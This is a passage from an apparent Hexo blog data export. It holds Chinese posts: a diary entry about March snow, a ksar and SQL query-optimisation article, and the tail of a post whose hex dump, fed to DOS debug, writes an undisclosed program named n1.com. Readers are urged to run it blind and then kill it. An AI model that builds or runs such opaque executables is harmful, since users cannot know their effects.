e9 29 6 67 59 43 10 7e c1 49 cd 5e f9 97 a 58 5f  8a 11<br />ef2f 4f 3d 9a e2 2b 22 58 fa be fc 69 91 7a 8c 3f 77 9f c9 3b 54 26 23  93 b3<br />ef47 85 de ae f5 bd c5 47 4c c4 cd 5e ad bc 8f ba 31 f6 e4 70 fb 6e a7  96 d5<br />ef5f ad 10 80 39 43 97 4f 10 cc 1b 8f 8d cd 4c 63 4 d8 1e 85 70 41 6c a8  eb df<br />ef78 7f 36 c5 60 a7 12 9 16 73 fe 75 3a 2d 40 29 7d aa a 5c 2 29 23 0 a6  e5 6b<br />ef92 24 6d 9b 20 e5 7 cb 40 b0 38 59 9c a7 69 6a 70 d3 38 ef e2 b2 11 3e  ea 2a<br />efab f9 2b 2e 43 1d 65 cf d6 1b ef 83 5a 5f e6 c5 62 16 ca 5e 4c a6 39  e4 53<br />efc3 2d 23 d2 5e 7e 15 54 8a 8 b7 3d bb 88 59 b9 9e a2 7c 42 1f a2 77 3c  5b 9<br />efdc 6d fa 8f 21 46 1a 3e ed ce 49 56 1d 29 2d 70 3 a7 6f 75 ac 1 87 ff  27 86<br />eff5 73 49 28 85 2d 97 7a 84 e 37 3d 86 10 21 4c e2 74 62 6b 51 70 8f 15  72 f3<br />e100e 81 b2 a9 9d 8a 63 ad 1b d5 aa 8a dc 96 3c e7 47 16 51 fc 87 50 9  b7 60<br />e1026 29 33 52 fb b0 df 70 c5 65 4a 60 3b c d7 a8 29 47 51 f7 8a 77 f3  99 3f<br />e103e 38 16 60 de 68 27 b2 24 7 62 a2 fd 40 86 b2 75 c3 3c 2f 3d fa 9 d9  a9 9a<br />e1057 71 3c ce 46 94 0 f9 bc 46 7f b8 2e 85 7f 7d d3 8d ea b4 63 81 59  10 bb<br />e106f 57 d0 b6 ab e1 83 74 1e 25 d5 73 78 18 b1 60 62 c f4 76 8d 17 d5  ed 23<br />e1087 23 e4 f6 32 64 5a 61 9 63 f6 92 57 d5 29 40 d6 3b ba 63 72 18 0 25  1b 7<br />e10a0 ee 7f 25 4a fa 6 74 19 46 e3 e8 89 7a c6 56 54 a7 43 13 4e bf 97  a5 6f<br />e10b8 99 2f ac 33 4d fa 58 3a 5a a a4 1a 74 62 c8 4f 3b 78 9 d7 ee 7e ee  2d 69<br />e10d1 30 40 ea 47 82 3b 85 8e 3 23 8f 74 4e 8 35 ab 74 4 1 57 d5 85 b1  6b 1e<br />e10ea f4 7d 1e d2 1e b3 fe f3 12 10 32 39 51 48 2d 6f e5 d3 a3 8c 8 8<br />g<br />rcx<br />fff<br />n1.com<br />w<br />q<br />----------------------------------------------------------------------------------<br /></code><code>----------------------------------------------------------------------------------</code>把上面的代码保存为debug111.txt<br />再运行 —》debug&lt;debug111.txt<br />你将看到什么？去看看吧&amp;#160;&amp;#160;<br />key“alt +enter” is to stop screen<br />然后结束进程就可以了。<br />这代码真的很变态，太强悍了、</p>\n"},{"title":"下雪了、","date":"2010-03-25T03:17:00.000Z","_content":"这年头，天气真犀利。现在这个季节还下雪，真是可怜啊，感到2012真会来。<br />昨天看今天的气温是1-7，这么冷，想着明天的风应该很大。早上醒来，真冷啊。只好穿羽绒服去上课了。出来宿舍楼，没想到，竟然飘起了雪花。十点多的时候大晴天了。什么鬼天气啊，变化这么快。弄的许多人都感冒了。","source":"_posts/下雪了、.md","raw":"title: 下雪了、\ncategories: [生活感想]\ntags: []\ndate: 2010-03-25 11:17:00\n---\n这年头，天气真犀利。现在这个季节还下雪，真是可怜啊，感到2012真会来。<br />昨天看今天的气温是1-7，这么冷，想着明天的风应该很大。早上醒来，真冷啊。只好穿羽绒服去上课了。出来宿舍楼，没想到，竟然飘起了雪花。十点多的时候大晴天了。什么鬼天气啊，变化这么快。弄的许多人都感冒了。","slug":"下雪了、","published":1,"updated":"2023-04-22T05:38:44.961Z","_id":"clgrjlxlf00am7opi97wscazf","comments":1,"layout":"post","photos":[],"link":"","content":"<p>这年头，天气真犀利。现在这个季节还下雪，真是可怜啊，感到2012真会来。<br />昨天看今天的气温是1-7，这么冷，想着明天的风应该很大。早上醒来，真冷啊。只好穿羽绒服去上课了。出来宿舍楼，没想到，竟然飘起了雪花。十点多的时候大晴天了。什么鬼天气啊，变化这么快。弄的许多人都感冒了。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>这年头，天气真犀利。现在这个季节还下雪，真是可怜啊，感到2012真会来。<br />昨天看今天的气温是1-7，这么冷，想着明天的风应该很大。早上醒来，真冷啊。只好穿羽绒服去上课了。出来宿舍楼，没想到，竟然飘起了雪花。十点多的时候大晴天了。什么鬼天气啊，变化这么快。弄的许多人都感冒了。</p>\n"},{"title":"使用 ksar 工具分析系统性能","date":"2013-04-13T04:58:17.000Z","_content":"简介： 系统性能监测是 Unix 和 Linux 系统管理员一个重要工作。如果服务器系统性能突然低于平均应有的情况，问题可能来自在执行的进程、内存的使用率、磁盘的性能、网络流量和 CPU 的压力。在 IT 预算有限的今天，理解如何优化系统性能比以往任何时候都重要。一味地硬件投资并不是能够让人们接受的办法，并且有时候也不一定生效。通常系统管理员使用一些基础的工具（top、vmstat、mpstat、ps、free）来辨别和处理一些性能问题。ksar 是 sar 的 Java 图形化版本，可以把系统信息如：cpu、内存、网络、I/O 等使用图形化方式体现。而且支持可以监控远程的 Unix 类操作系统（Linux、AIX、Solaris、HPUX）。\n详见IBM文档库：http://www.ibm.com/developerworks/cn/linux/1303_caojh_ksar/\n[转载]处理上百万条的数据库如何提高处理查询速度\n2013/01/30 分类:数据库 0\n1、对查询进行优化，应尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引。\n2、应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描，如：\n　　select id from t where num is null\n　　可以在num上设置默认值0，确保表中num列没有null值，然后这样查询：\n　　select id from t where num=0\n3、应尽量避免在 where 子句中使用!=或<>操作符，否则将引擎放弃使用索引而进行全表扫描。\n4、应尽量避免在 where 子句中使用 or 来连接条件，否则将导致引擎放弃使用索引而进行全表扫描，如：\n　　select id from t where num=10 or num=20\n　　可以这样查询：\n　　select id from t where num=10\n　　union all\n　　select id from t where num=20\n5、in 和 not in 也要慎用，否则会导致全表扫描，如：\n　　select id from t where num in(1,2,3)\n　　对于连续的数值，能用 between 就不要用 in 了：\n　　select id from t where num between 1 and 3\n6、下面的查询也将导致全表扫描：\n　　select id from t where name like ‘%abc%’\n　　若要提高效率，可以考虑全文检索。\n7、如果在 where 子句中使用参数，也会导致全表扫描。因为SQL只有在运行时才会解析局部变量，但优化程序不能将访问计划的选择推迟到运行时；它必须在编译时进行选择。然而，如果在编译时建立访问计划，变量的值还是未知的，因而无法作为索引选择的输入项。如下面语句将进行全表扫描：\n　　select id from t where num=@num\n　　可以改为强制查询使用索引：\n　　select id from t with(index(索引名)) where num=@num\n8、应尽量避免在 where 子句中对字段进行表达式操作，这将导致引擎放弃使用索引而进行全表扫描。如：\n　　select id from t where num/2=100\n　　应改为:\n　　select id from t where num=100*2\n9、应尽量避免在where子句中对字段进行函数操作，这将导致引擎放弃使用索引而进行全表扫描。如：\n　　select id from t where substring(name,1,3)=’abc’–name以abc开头的id\n　　select id from t where datediff(day,createdate,’2005-11-30′)=0–‘2005-11-30’生成的id\n　　应改为:\n　　select id from t where name like ‘abc%’\n　　select id from t where createdate>=’2005-11-30′ and createdate<'2005-12-1'\n10、不要在 where 子句中的“=”左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用索引。\n11、在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件时才能保证系统使用该索引，否则该索引将不会被使用，并且应尽可能的让字段顺序与索引顺序相一致。\n12、不要写一些没有意义的查询，如需要生成一个空表结构：\n　　select col1,col2 into #t from t where 1=0\n　　这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样：\n　　create table #t(...)\n13、很多时候用 exists 代替 in 是一个好的选择：\n　　select num from a where num in(select num from b)\n　　用下面的语句替换：\n　　select num from a where exists(select 1 from b where num=a.num)＼\n14、并不是所有索引对查询都有效，SQL是根据表中数据来进行查询优化的，当索引列有大量数据重复时，SQL查询可能不会去利用索引，如一表中有字段sex，male、female几乎各一半，那么即使在sex上建了索引也对查询效率起不了作用。\n15、索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引，所以怎样建索引需要慎重考虑，视具体情况而定。一个表的索引数最好不要超过6个，若太多则应考虑一些不常使用到的列上建的索引是否有必要。\n16、应尽可能的避免更新 clustered 索引数据列，因为 clustered 索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新 clustered 索引数据列，那么需要考虑是否应将该索引建为 clustered 索引。\n17、尽量使用数字型字段，若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销。这是因为引擎在处理查询和连接时会逐个比较字符串中每一个字符，而对于数字型而言只需要比较一次就够了。\n18、尽可能的使用 varchar/nvarchar 代替 char/nchar ，因为首先变长字段存储空间小，可以节省存储空间，其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。\n19、任何地方都不要使用 select * from t ，用具体的字段列表代替“*”，不要返回用不到的任何字段。\n20、尽量使用表变量来代替临时表。如果表变量包含大量数据，请注意索引非常有限（只有主键索引）。\n21、避免频繁创建和删除临时表，以减少系统表资源的消耗。\n22、临时表并不是不可使用，适当地使用它们可以使某些例程更有效，例如，当需要重复引用大型表或常用表中的某个数据集时。但是，对于一次性事件，最好使用导出表。\n23、在新建临时表时，如果一次性插入数据量很大，那么可以使用 select into 代替 create table，避免造成大量 log ，以提高速度；如果数据量不大，为了缓和系统表的资源，应先create table，然后insert。\n24、如果使用到了临时表，在存储过程的最后务必将所有的临时表显式删除，先 truncate table ，然后 drop table ，这样可以避免系统表的较长时间锁定。\n25、尽量避免使用游标，因为游标的效率较差，如果游标操作的数据超过1万行，那么就应该考虑改写。\n26、使用基于游标的方法或临时表方法之前，应先寻找基于集的解决方案来解决问题，基于集的方法通常更有效。\n27、与临时表一样，游标并不是不可使用。对小型数据集使用 FAST_FORWARD 游标通常要优于其他逐行处理方法，尤其是在必须引用几个表才能获得所需的数据时。在结果集中包括“合计”的例程通常要比使用游标执行的速度快。如果开发时间允许，基于游标的方法和基于集的方法都可以尝试一下，看哪一种方法的效果更好。\n28、在所有的存储过程和触发器的开始处设置 SET NOCOUNT ON ，在结束时设置 SET NOCOUNT OFF 。无需在执行存储过程和触发器的每个语句后向客户端发送 DONE_IN_PROC 消息。\n29、尽量避免大事务操作，提高系统并发能力。\n30、尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。\n<转载与web开发者>","source":"_posts/使用-ksar-工具分析系统性能.md","raw":"title: 使用 ksar 工具分析系统性能\ncategories: [操作系统,Linux]\ntags: []\ndate: 2013-04-13 12:58:17\n---\n简介： 系统性能监测是 Unix 和 Linux 系统管理员一个重要工作。如果服务器系统性能突然低于平均应有的情况，问题可能来自在执行的进程、内存的使用率、磁盘的性能、网络流量和 CPU 的压力。在 IT 预算有限的今天，理解如何优化系统性能比以往任何时候都重要。一味地硬件投资并不是能够让人们接受的办法，并且有时候也不一定生效。通常系统管理员使用一些基础的工具（top、vmstat、mpstat、ps、free）来辨别和处理一些性能问题。ksar 是 sar 的 Java 图形化版本，可以把系统信息如：cpu、内存、网络、I/O 等使用图形化方式体现。而且支持可以监控远程的 Unix 类操作系统（Linux、AIX、Solaris、HPUX）。\n详见IBM文档库：http://www.ibm.com/developerworks/cn/linux/1303_caojh_ksar/\n[转载]处理上百万条的数据库如何提高处理查询速度\n2013/01/30 分类:数据库 0\n1、对查询进行优化，应尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引。\n2、应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描，如：\n　　select id from t where num is null\n　　可以在num上设置默认值0，确保表中num列没有null值，然后这样查询：\n　　select id from t where num=0\n3、应尽量避免在 where 子句中使用!=或<>操作符，否则将引擎放弃使用索引而进行全表扫描。\n4、应尽量避免在 where 子句中使用 or 来连接条件，否则将导致引擎放弃使用索引而进行全表扫描，如：\n　　select id from t where num=10 or num=20\n　　可以这样查询：\n　　select id from t where num=10\n　　union all\n　　select id from t where num=20\n5、in 和 not in 也要慎用，否则会导致全表扫描，如：\n　　select id from t where num in(1,2,3)\n　　对于连续的数值，能用 between 就不要用 in 了：\n　　select id from t where num between 1 and 3\n6、下面的查询也将导致全表扫描：\n　　select id from t where name like ‘%abc%’\n　　若要提高效率，可以考虑全文检索。\n7、如果在 where 子句中使用参数，也会导致全表扫描。因为SQL只有在运行时才会解析局部变量，但优化程序不能将访问计划的选择推迟到运行时；它必须在编译时进行选择。然而，如果在编译时建立访问计划，变量的值还是未知的，因而无法作为索引选择的输入项。如下面语句将进行全表扫描：\n　　select id from t where num=@num\n　　可以改为强制查询使用索引：\n　　select id from t with(index(索引名)) where num=@num\n8、应尽量避免在 where 子句中对字段进行表达式操作，这将导致引擎放弃使用索引而进行全表扫描。如：\n　　select id from t where num/2=100\n　　应改为:\n　　select id from t where num=100*2\n9、应尽量避免在where子句中对字段进行函数操作，这将导致引擎放弃使用索引而进行全表扫描。如：\n　　select id from t where substring(name,1,3)=’abc’–name以abc开头的id\n　　select id from t where datediff(day,createdate,’2005-11-30′)=0–‘2005-11-30’生成的id\n　　应改为:\n　　select id from t where name like ‘abc%’\n　　select id from t where createdate>=’2005-11-30′ and createdate<'2005-12-1'\n10、不要在 where 子句中的“=”左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用索引。\n11、在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件时才能保证系统使用该索引，否则该索引将不会被使用，并且应尽可能的让字段顺序与索引顺序相一致。\n12、不要写一些没有意义的查询，如需要生成一个空表结构：\n　　select col1,col2 into #t from t where 1=0\n　　这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样：\n　　create table #t(...)\n13、很多时候用 exists 代替 in 是一个好的选择：\n　　select num from a where num in(select num from b)\n　　用下面的语句替换：\n　　select num from a where exists(select 1 from b where num=a.num)＼\n14、并不是所有索引对查询都有效，SQL是根据表中数据来进行查询优化的，当索引列有大量数据重复时，SQL查询可能不会去利用索引，如一表中有字段sex，male、female几乎各一半，那么即使在sex上建了索引也对查询效率起不了作用。\n15、索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引，所以怎样建索引需要慎重考虑，视具体情况而定。一个表的索引数最好不要超过6个，若太多则应考虑一些不常使用到的列上建的索引是否有必要。\n16、应尽可能的避免更新 clustered 索引数据列，因为 clustered 索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新 clustered 索引数据列，那么需要考虑是否应将该索引建为 clustered 索引。\n17、尽量使用数字型字段，若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销。这是因为引擎在处理查询和连接时会逐个比较字符串中每一个字符，而对于数字型而言只需要比较一次就够了。\n18、尽可能的使用 varchar/nvarchar 代替 char/nchar ，因为首先变长字段存储空间小，可以节省存储空间，其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。\n19、任何地方都不要使用 select * from t ，用具体的字段列表代替“*”，不要返回用不到的任何字段。\n20、尽量使用表变量来代替临时表。如果表变量包含大量数据，请注意索引非常有限（只有主键索引）。\n21、避免频繁创建和删除临时表，以减少系统表资源的消耗。\n22、临时表并不是不可使用，适当地使用它们可以使某些例程更有效，例如，当需要重复引用大型表或常用表中的某个数据集时。但是，对于一次性事件，最好使用导出表。\n23、在新建临时表时，如果一次性插入数据量很大，那么可以使用 select into 代替 create table，避免造成大量 log ，以提高速度；如果数据量不大，为了缓和系统表的资源，应先create table，然后insert。\n24、如果使用到了临时表，在存储过程的最后务必将所有的临时表显式删除，先 truncate table ，然后 drop table ，这样可以避免系统表的较长时间锁定。\n25、尽量避免使用游标，因为游标的效率较差，如果游标操作的数据超过1万行，那么就应该考虑改写。\n26、使用基于游标的方法或临时表方法之前，应先寻找基于集的解决方案来解决问题，基于集的方法通常更有效。\n27、与临时表一样，游标并不是不可使用。对小型数据集使用 FAST_FORWARD 游标通常要优于其他逐行处理方法，尤其是在必须引用几个表才能获得所需的数据时。在结果集中包括“合计”的例程通常要比使用游标执行的速度快。如果开发时间允许，基于游标的方法和基于集的方法都可以尝试一下，看哪一种方法的效果更好。\n28、在所有的存储过程和触发器的开始处设置 SET NOCOUNT ON ，在结束时设置 SET NOCOUNT OFF 。无需在执行存储过程和触发器的每个语句后向客户端发送 DONE_IN_PROC 消息。\n29、尽量避免大事务操作，提高系统并发能力。\n30、尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。\n<转载与web开发者>","slug":"使用-ksar-工具分析系统性能","published":1,"updated":"2023-04-22T05:38:44.981Z","_id":"clgrjlxlg00an7opicg1237w4","comments":1,"layout":"post","photos":[],"link":"","content":"<p>简介： 系统性能监测是 Unix 和 Linux 系统管理员一个重要工作。如果服务器系统性能突然低于平均应有的情况，问题可能来自在执行的进程、内存的使用率、磁盘的性能、网络流量和 CPU 的压力。在 IT 预算有限的今天，理解如何优化系统性能比以往任何时候都重要。一味地硬件投资并不是能够让人们接受的办法，并且有时候也不一定生效。通常系统管理员使用一些基础的工具（top、vmstat、mpstat、ps、free）来辨别和处理一些性能问题。ksar 是 sar 的 Java 图形化版本，可以把系统信息如：cpu、内存、网络、I&#x2F;O 等使用图形化方式体现。而且支持可以监控远程的 Unix 类操作系统（Linux、AIX、Solaris、HPUX）。<br>详见IBM文档库：<a href=\"http://www.ibm.com/developerworks/cn/linux/1303_caojh_ksar/\">http://www.ibm.com/developerworks/cn/linux/1303_caojh_ksar/</a><br>[转载]处理上百万条的数据库如何提高处理查询速度<br>2013&#x2F;01&#x2F;30 分类:数据库 0<br>1、对查询进行优化，应尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引。<br>2、应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描，如：<br>　　select id from t where num is null<br>　　可以在num上设置默认值0，确保表中num列没有null值，然后这样查询：<br>　　select id from t where num&#x3D;0<br>3、应尽量避免在 where 子句中使用!&#x3D;或&lt;&gt;操作符，否则将引擎放弃使用索引而进行全表扫描。<br>4、应尽量避免在 where 子句中使用 or 来连接条件，否则将导致引擎放弃使用索引而进行全表扫描，如：<br>　　select id from t where num&#x3D;10 or num&#x3D;20<br>　　可以这样查询：<br>　　select id from t where num&#x3D;10<br>　　union all<br>　　select id from t where num&#x3D;20<br>5、in 和 not in 也要慎用，否则会导致全表扫描，如：<br>　　select id from t where num in(1,2,3)<br>　　对于连续的数值，能用 between 就不要用 in 了：<br>　　select id from t where num between 1 and 3<br>6、下面的查询也将导致全表扫描：<br>　　select id from t where name like ‘%abc%’<br>　　若要提高效率，可以考虑全文检索。<br>7、如果在 where 子句中使用参数，也会导致全表扫描。因为SQL只有在运行时才会解析局部变量，但优化程序不能将访问计划的选择推迟到运行时；它必须在编译时进行选择。然而，如果在编译时建立访问计划，变量的值还是未知的，因而无法作为索引选择的输入项。如下面语句将进行全表扫描：<br>　　select id from t where num&#x3D;@num<br>　　可以改为强制查询使用索引：<br>　　select id from t with(index(索引名)) where num&#x3D;@num<br>8、应尽量避免在 where 子句中对字段进行表达式操作，这将导致引擎放弃使用索引而进行全表扫描。如：<br>　　select id from t where num&#x2F;2&#x3D;100<br>　　应改为:<br>　　select id from t where num&#x3D;100*2<br>9、应尽量避免在where子句中对字段进行函数操作，这将导致引擎放弃使用索引而进行全表扫描。如：<br>　　select id from t where substring(name,1,3)&#x3D;’abc’–name以abc开头的id<br>　　select id from t where datediff(day,createdate,’2005-11-30′)&#x3D;0–‘2005-11-30’生成的id<br>　　应改为:<br>　　select id from t where name like ‘abc%’<br>　　select id from t where createdate&gt;&#x3D;’2005-11-30′ and createdate&lt;’2005-12-1’<br>10、不要在 where 子句中的“&#x3D;”左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用索引。<br>11、在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件时才能保证系统使用该索引，否则该索引将不会被使用，并且应尽可能的让字段顺序与索引顺序相一致。<br>12、不要写一些没有意义的查询，如需要生成一个空表结构：<br>　　select col1,col2 into #t from t where 1&#x3D;0<br>　　这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样：<br>　　create table #t(…)<br>13、很多时候用 exists 代替 in 是一个好的选择：<br>　　select num from a where num in(select num from b)<br>　　用下面的语句替换：<br>　　select num from a where exists(select 1 from b where num&#x3D;a.num)＼<br>14、并不是所有索引对查询都有效，SQL是根据表中数据来进行查询优化的，当索引列有大量数据重复时，SQL查询可能不会去利用索引，如一表中有字段sex，male、female几乎各一半，那么即使在sex上建了索引也对查询效率起不了作用。<br>15、索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引，所以怎样建索引需要慎重考虑，视具体情况而定。一个表的索引数最好不要超过6个，若太多则应考虑一些不常使用到的列上建的索引是否有必要。<br>16、应尽可能的避免更新 clustered 索引数据列，因为 clustered 索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新 clustered 索引数据列，那么需要考虑是否应将该索引建为 clustered 索引。<br>17、尽量使用数字型字段，若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销。这是因为引擎在处理查询和连接时会逐个比较字符串中每一个字符，而对于数字型而言只需要比较一次就够了。<br>18、尽可能的使用 varchar&#x2F;nvarchar 代替 char&#x2F;nchar ，因为首先变长字段存储空间小，可以节省存储空间，其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。<br>19、任何地方都不要使用 select * from t ，用具体的字段列表代替“*”，不要返回用不到的任何字段。<br>20、尽量使用表变量来代替临时表。如果表变量包含大量数据，请注意索引非常有限（只有主键索引）。<br>21、避免频繁创建和删除临时表，以减少系统表资源的消耗。<br>22、临时表并不是不可使用，适当地使用它们可以使某些例程更有效，例如，当需要重复引用大型表或常用表中的某个数据集时。但是，对于一次性事件，最好使用导出表。<br>23、在新建临时表时，如果一次性插入数据量很大，那么可以使用 select into 代替 create table，避免造成大量 log ，以提高速度；如果数据量不大，为了缓和系统表的资源，应先create table，然后insert。<br>24、如果使用到了临时表，在存储过程的最后务必将所有的临时表显式删除，先 truncate table ，然后 drop table ，这样可以避免系统表的较长时间锁定。<br>25、尽量避免使用游标，因为游标的效率较差，如果游标操作的数据超过1万行，那么就应该考虑改写。<br>26、使用基于游标的方法或临时表方法之前，应先寻找基于集的解决方案来解决问题，基于集的方法通常更有效。<br>27、与临时表一样，游标并不是不可使用。对小型数据集使用 FAST_FORWARD 游标通常要优于其他逐行处理方法，尤其是在必须引用几个表才能获得所需的数据时。在结果集中包括“合计”的例程通常要比使用游标执行的速度快。如果开发时间允许，基于游标的方法和基于集的方法都可以尝试一下，看哪一种方法的效果更好。<br>28、在所有的存储过程和触发器的开始处设置 SET NOCOUNT ON ，在结束时设置 SET NOCOUNT OFF 。无需在执行存储过程和触发器的每个语句后向客户端发送 DONE_IN_PROC 消息。<br>29、尽量避免大事务操作，提高系统并发能力。<br>30、尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。<br>&lt;转载与web开发者&gt;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>简介： 系统性能监测是 Unix 和 Linux 系统管理员一个重要工作。如果服务器系统性能突然低于平均应有的情况，问题可能来自在执行的进程、内存的使用率、磁盘的性能、网络流量和 CPU 的压力。在 IT 预算有限的今天，理解如何优化系统性能比以往任何时候都重要。一味地硬件投资并不是能够让人们接受的办法，并且有时候也不一定生效。通常系统管理员使用一些基础的工具（top、vmstat、mpstat、ps、free）来辨别和处理一些性能问题。ksar 是 sar 的 Java 图形化版本，可以把系统信息如：cpu、内存、网络、I&#x2F;O 等使用图形化方式体现。而且支持可以监控远程的 Unix 类操作系统（Linux、AIX、Solaris、HPUX）。<br>详见IBM文档库：<a href=\"http://www.ibm.com/developerworks/cn/linux/1303_caojh_ksar/\">http://www.ibm.com/developerworks/cn/linux/1303_caojh_ksar/</a><br>[转载]处理上百万条的数据库如何提高处理查询速度<br>2013&#x2F;01&#x2F;30 分类:数据库 0<br>1、对查询进行优化，应尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引。<br>2、应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描，如：<br>　　select id from t where num is null<br>　　可以在num上设置默认值0，确保表中num列没有null值，然后这样查询：<br>　　select id from t where num&#x3D;0<br>3、应尽量避免在 where 子句中使用!&#x3D;或&lt;&gt;操作符，否则将引擎放弃使用索引而进行全表扫描。<br>4、应尽量避免在 where 子句中使用 or 来连接条件，否则将导致引擎放弃使用索引而进行全表扫描，如：<br>　　select id from t where num&#x3D;10 or num&#x3D;20<br>　　可以这样查询：<br>　　select id from t where num&#x3D;10<br>　　union all<br>　　select id from t where num&#x3D;20<br>5、in 和 not in 也要慎用，否则会导致全表扫描，如：<br>　　select id from t where num in(1,2,3)<br>　　对于连续的数值，能用 between 就不要用 in 了：<br>　　select id from t where num between 1 and 3<br>6、下面的查询也将导致全表扫描：<br>　　select id from t where name like ‘%abc%’<br>　　若要提高效率，可以考虑全文检索。<br>7、如果在 where 子句中使用参数，也会导致全表扫描。因为SQL只有在运行时才会解析局部变量，但优化程序不能将访问计划的选择推迟到运行时；它必须在编译时进行选择。然而，如果在编译时建立访问计划，变量的值还是未知的，因而无法作为索引选择的输入项。如下面语句将进行全表扫描：<br>　　select id from t where num&#x3D;@num<br>　　可以改为强制查询使用索引：<br>　　select id from t with(index(索引名)) where num&#x3D;@num<br>8、应尽量避免在 where 子句中对字段进行表达式操作，这将导致引擎放弃使用索引而进行全表扫描。如：<br>　　select id from t where num&#x2F;2&#x3D;100<br>　　应改为:<br>　　select id from t where num&#x3D;100*2<br>9、应尽量避免在where子句中对字段进行函数操作，这将导致引擎放弃使用索引而进行全表扫描。如：<br>　　select id from t where substring(name,1,3)&#x3D;’abc’–name以abc开头的id<br>　　select id from t where datediff(day,createdate,’2005-11-30′)&#x3D;0–‘2005-11-30’生成的id<br>　　应改为:<br>　　select id from t where name like ‘abc%’<br>　　select id from t where createdate&gt;&#x3D;’2005-11-30′ and createdate&lt;’2005-12-1’<br>10、不要在 where 子句中的“&#x3D;”左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用索引。<br>11、在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件时才能保证系统使用该索引，否则该索引将不会被使用，并且应尽可能的让字段顺序与索引顺序相一致。<br>12、不要写一些没有意义的查询，如需要生成一个空表结构：<br>　　select col1,col2 into #t from t where 1&#x3D;0<br>　　这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样：<br>　　create table #t(…)<br>13、很多时候用 exists 代替 in 是一个好的选择：<br>　　select num from a where num in(select num from b)<br>　　用下面的语句替换：<br>　　select num from a where exists(select 1 from b where num&#x3D;a.num)＼<br>14、并不是所有索引对查询都有效，SQL是根据表中数据来进行查询优化的，当索引列有大量数据重复时，SQL查询可能不会去利用索引，如一表中有字段sex，male、female几乎各一半，那么即使在sex上建了索引也对查询效率起不了作用。<br>15、索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引，所以怎样建索引需要慎重考虑，视具体情况而定。一个表的索引数最好不要超过6个，若太多则应考虑一些不常使用到的列上建的索引是否有必要。<br>16、应尽可能的避免更新 clustered 索引数据列，因为 clustered 索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新 clustered 索引数据列，那么需要考虑是否应将该索引建为 clustered 索引。<br>17、尽量使用数字型字段，若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销。这是因为引擎在处理查询和连接时会逐个比较字符串中每一个字符，而对于数字型而言只需要比较一次就够了。<br>18、尽可能的使用 varchar&#x2F;nvarchar 代替 char&#x2F;nchar ，因为首先变长字段存储空间小，可以节省存储空间，其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。<br>19、任何地方都不要使用 select * from t ，用具体的字段列表代替“*”，不要返回用不到的任何字段。<br>20、尽量使用表变量来代替临时表。如果表变量包含大量数据，请注意索引非常有限（只有主键索引）。<br>21、避免频繁创建和删除临时表，以减少系统表资源的消耗。<br>22、临时表并不是不可使用，适当地使用它们可以使某些例程更有效，例如，当需要重复引用大型表或常用表中的某个数据集时。但是，对于一次性事件，最好使用导出表。<br>23、在新建临时表时，如果一次性插入数据量很大，那么可以使用 select into 代替 create table，避免造成大量 log ，以提高速度；如果数据量不大，为了缓和系统表的资源，应先create table，然后insert。<br>24、如果使用到了临时表，在存储过程的最后务必将所有的临时表显式删除，先 truncate table ，然后 drop table ，这样可以避免系统表的较长时间锁定。<br>25、尽量避免使用游标，因为游标的效率较差，如果游标操作的数据超过1万行，那么就应该考虑改写。<br>26、使用基于游标的方法或临时表方法之前，应先寻找基于集的解决方案来解决问题，基于集的方法通常更有效。<br>27、与临时表一样，游标并不是不可使用。对小型数据集使用 FAST_FORWARD 